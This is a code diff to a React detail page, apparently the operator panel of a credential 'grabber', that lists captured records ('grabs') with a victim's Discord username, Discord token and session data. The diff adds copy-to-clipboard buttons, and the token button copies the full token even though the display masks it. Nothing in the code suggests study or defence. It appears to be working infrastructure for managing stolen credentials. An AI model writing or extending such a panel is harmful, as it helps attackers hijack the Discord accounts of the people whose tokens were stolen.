@@ -53,6 +53,8 @@ export default function GrabDetailPage() {
   const [deleting, setDeleting] = useState(false);
   const [copied, setCopied] = useState(false);
   const [copiedSession, setCopiedSession] = useState(false);
+  const [copiedDiscord, setCopiedDiscord] = useState(false);
+  const [copiedToken, setCopiedToken] = useState(false);
 
   useEffect(() => {
     fetch(`/api/grabs/${params.id}`)
@@ -106,6 +108,18 @@ export default function GrabDetailPage() {
     navigator.clipboard.writeText(lines);
     setCopiedSession(true);
     setTimeout(() => setCopiedSession(false), 2000);
+  };
+
+  const handleCopyDiscord = () => {
+    navigator.clipboard.writeText(grab.discord_username || '');
+    setCopiedDiscord(true);
+    setTimeout(() => setCopiedDiscord(false), 2000);
+  };
+
+  const handleCopyToken = () => {
+    navigator.clipboard.writeText(grab.discord_token || '');
+    setCopiedToken(true);
+    setTimeout(() => setCopiedToken(false), 2000);
   };
 
   const mask = (val) => {
@@ -219,8 +233,24 @@ export default function GrabDetailPage() {
             <InfoRow label="Language" value={grab.language} />
           </GrabSection>
           <GrabSection title="Discord Info" icon="💬">
-            <InfoRow label="Discord Username" value={grab.discord_username} />
-            <InfoRow label="Discord Token" value={mask(grab.discord_token)} full />
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: `1px solid ${colors.border}`, fontSize: 13 }}>
+              <span style={{ color: colors.textDim }}>Discord Username</span>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                <span style={{ color: colors.text, textAlign: 'right', maxWidth: '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{grab.discord_username || '—'}</span>
+                <div onClick={handleCopyDiscord} style={{ cursor: 'pointer', color: copiedDiscord ? colors.green : colors.textDim, fontSize: 11, flexShrink: 0, padding: '2px 6px', borderRadius: 4, border: `1px solid ${colors.border}`, transition: 'color 0.15s' }}>
+                  {copiedDiscord ? '✓' : '📋'}
+                </div>
+              </div>
+            </div>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: `1px solid ${colors.border}`, fontSize: 13 }}>
+              <span style={{ color: colors.textDim }}>Discord Token</span>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                <span style={{ color: colors.text, textAlign: 'right', maxWidth: '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{mask(grab.discord_token)}</span>
+                <div onClick={handleCopyToken} style={{ cursor: 'pointer', color: copiedToken ? colors.green : colors.textDim, fontSize: 11, flexShrink: 0, padding: '2px 6px', borderRadius: 4, border: `1px solid ${colors.border}`, transition: 'color 0.15s' }}>
+                  {copiedToken ? '✓' : '📋'}
+                </div>
+              </div>
+            </div>
           </GrabSection>
         </div>
 
